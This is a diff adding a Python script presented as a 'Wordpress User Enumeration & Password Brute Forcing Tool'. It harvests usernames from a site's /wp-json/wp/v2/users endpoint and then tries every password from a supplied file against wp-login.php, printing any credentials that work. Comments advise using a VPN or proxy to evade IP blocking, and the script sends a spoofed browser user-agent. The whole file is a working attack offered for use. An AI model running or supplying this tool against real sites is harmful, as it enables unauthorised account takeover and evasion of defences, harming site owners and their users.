@@ -1,0 +1,82 @@
+#!/usr/bin/python3
+
+import argparse
+import json
+import requests
+
+
+# Define the main function to take command line arguments
+# When sending too many requests, the server will block the IP address
+# To avoid this, use a VPN or a proxy
+def main():
+    for user in user_list():
+        for password in password_list:
+            url = login(user, password)
+            if "Error" in url:
+                continue
+            else:
+                print("Username: " + user + " Password: " + password)
+                break
+
+
+# Create a list of valid usernames 
+def user_list():
+    url = TARGET_URL + "/wp-json/wp/v2/users"
+    r = requests.get(url, headers=HEADERS)
+    data = json.loads(r.text)
+    usernames = []
+    for i in data:
+        usernames.append(i["name"].lower().split(" ")[0])
+    return usernames
+
+
+# Define the data to be sent to the login page
+# The format of this form may vary
+def form(username, password):
+    data = {
+        "log": username,
+        "pwd": password,
+        "wp-submit": "Log In",
+        "redirect_to": TARGET_URL + "/wp-admin/",
+        "testcookie": "1"
+    }
+    return data
+
+
+# Send a POST request to the login page for each username and password combination
+def login(username, password):
+    url = TARGET_URL + "/wp-login.php"
+    r = requests.post(url, headers=HEADERS, data=form(username, password))
+    return(r.text)
+
+
+# Retrieve the password list from a file
+def read(password_file):
+    with open(password_file, "r") as f:
+        list_of_passwords = f.read().splitlines()
+        return list_of_passwords
+
+# Define the command line arguments
+parser = argparse.ArgumentParser(
+        description = "Wordpress User Enumeration & Password Brute Forcing Tool",
+        prog="wp-users.py",
+        usage="%(prog)s -u <url> -p </path/to/password_file>"
+        )
+parser.add_argument("-u", "--url",
+        help = "Target URL",
+        required = True,
+        metavar = ""
+    )
+parser.add_argument("-p", 
+        "--password",
+        help="Password file", 
+        required=True,
+        metavar = ""
+        )
+TARGET_URL = parser.parse_args().url
+HEADERS = {"user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36"}
+password_file = parser.parse_args().password
+password_list = read(password_file)
+
+if __name__ == "__main__":
+    main()
